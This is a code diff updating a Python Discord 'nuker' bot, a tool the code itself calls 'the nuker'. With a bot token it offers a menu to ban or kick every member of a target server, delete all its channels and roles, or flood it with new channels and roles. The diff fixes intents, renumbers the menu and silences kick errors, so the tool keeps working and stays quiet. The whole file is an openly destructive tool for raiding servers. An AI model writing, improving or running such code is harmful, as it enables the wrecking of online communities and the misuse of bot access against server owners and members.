@@ -1,7 +1,6 @@
 import discord, sys, random, string, os, time
 from . import bot_token
 from discord.ext import commands
-from discord.utils import get
 from colorama import Fore
 
 os.system("cls")
@@ -20,8 +19,7 @@ print(f"""{Fore.LIGHTRED_EX}
 """)
 print("\n")
 intents = discord.Intents.all()
-client = commands.Bot(command_prefix = '.')
-
+client = commands.Bot(command_prefix = '.', intents=intents)
 
 async def ban_all(guild_id):
     guild = discord.utils.get(client.guilds, id=guild_id)
@@ -35,6 +33,7 @@ async def ban_all(guild_id):
         except Exception as e:
             print(f"{Fore.RED}[ERROR] {e}")
 
+
 async def kick_all(guild_id):
     guild = discord.utils.get(client.guilds, id=guild_id)
     if guild == None:
@@ -42,10 +41,13 @@ async def kick_all(guild_id):
         return
 
     for member in guild.members:
+        print(guild.members)
         try:
             await member.kick(reason=None)
         except Exception as e:
-            print(f"{Fore.RED}[ERROR] {e}")
+            pass
+            # print(f"{Fore.RED}[ERROR] {e}")
+
 
 async def create_channels(guild_id, amount):
     guild = discord.utils.get(client.guilds, id=guild_id)
@@ -104,42 +106,46 @@ async def delete_roles(guild_id):
 async def on_ready():
     print("Bot is ready!\n\n")
     while True:
-        print("[CONSOLE] [0] Go Back.")
-        print("[CONSOLE] [1] Ban all users.")
-        print("[CONSOLE] [2] Kick all users.")
-        print("[CONSOLE] [3] Mass channel create.")
-        print("[CONSOLE] [4] Delete all channels.")
-        print("[CONSOLE] [5] Mass role create.")
-        print("[CONSOLE] [6] Delete all roles")
+        print("[CONSOLE] [1] Go Back.")
+        print("[CONSOLE] [2] Ban all users.")
+        print("[CONSOLE] [3] Kick all users.")
+        print("[CONSOLE] [4] Mass channel create.")
+        print("[CONSOLE] [5] Delete all channels.")
+        print("[CONSOLE] [6] Mass role create.")
+        print("[CONSOLE] [7] Delete all roles")
         try:
             option = int(input("\n: "))
         except:
             print(f"\n{Fore.RED}[ERROR] Choose a number between 0-6!")
-            time.sleep(4)
-            await client.logout()
-            break
+            time.sleep(1)
+            print(f"{Fore.RED}\n[REMINDER] To restart the nuker, Repoen The Program!!\n")
+            time.sleep(3)
+            await client.close()
+            return
 
-        if option == 0:
-            await client.logout()
-            break
+        if option == 1:
+            print(f"{Fore.RED}\n[REMINDER] To restart the nuker, Repoen The Program!!\n")
+            time.sleep(3)
+            await client.close()
+            return
 
         guild_target = int(input("\nServer target ID: "))
 
-        if option == 1:
+        if option == 2:
             os.system("cls")
             print("starting...")
             time.sleep(3)
             await ban_all(guild_target)
             print("Done!")
 
-        elif option == 2:
+        elif option == 3:
             os.system("cls")
             print("starting...")
             time.sleep(3)   
             await kick_all(guild_target)
             print("Done!")
 
-        elif option == 3:
+        elif option == 4:
             am = int(input("Amount of channels to create (nums): "))
             os.system("cls")
             print("starting...")
@@ -147,14 +153,14 @@ async def on_ready():
             await create_channels(guild_target, am)
             print("Done!")
 
-        elif option == 4:
+        elif option == 5:
             os.system("cls")
             print("starting...")
             time.sleep(3)
             await delete_channels(guild_target)
             print("Done!")
 
-        elif option == 5:
+        elif option == 6:
             am = int(input("Amount of roles to create (nums): "))
             os.system("cls")
             print("starting...")
@@ -162,15 +168,12 @@ async def on_ready():
             await create_roles(guild_target, am)
             print("Done!")
 
-        elif option == 6:
+        elif option == 7:
             os.system("cls")
             print("starting...")
             time.sleep(3)
             await delete_roles(guild_target)
             print("Done!")
-
-        elif option == 7:
-            sys.exit(0)
 
 try:
     client.run(bot_token)
@@ -178,3 +181,6 @@ except discord.errors.LoginFailure:
     print(f"{Fore.RED}[ERROR] Bad Token!")
     time.sleep(5)
     sys.exit(0)
+
+except:
+    pass
